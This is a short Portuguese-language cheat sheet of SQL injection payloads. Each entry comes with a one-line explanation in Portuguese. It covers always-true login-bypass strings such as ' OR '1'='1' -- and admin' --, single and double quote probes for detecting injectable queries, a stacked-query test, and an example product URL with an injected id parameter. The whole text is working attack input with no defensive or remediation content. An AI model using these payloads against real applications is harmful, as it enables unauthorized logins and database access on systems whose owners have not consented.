' OR '1'='1' --	Bypass de login (retorna verdadeiro se a query for concatenada sem sanitização).
" OR "" = "	Versão para aspas duplas.
' OR 1=1 --	Similar ao primeiro, mas usando 1=1 (sempre verdadeiro).
admin' --	Tenta logar como usuário admin sem senha.
' OR 'a'='a	Outra variação de condição sempre verdadeira.

Injeção	O que faz?
'	Se a aplicação retornar erro de SQL, há vulnerabilidade.
"	Testa aspas duplas.
' ; --	Verifica se o sistema permite múltiplos comandos (;) ou comentários (--).

http://site.com/produto?id=1' AND 1=1 --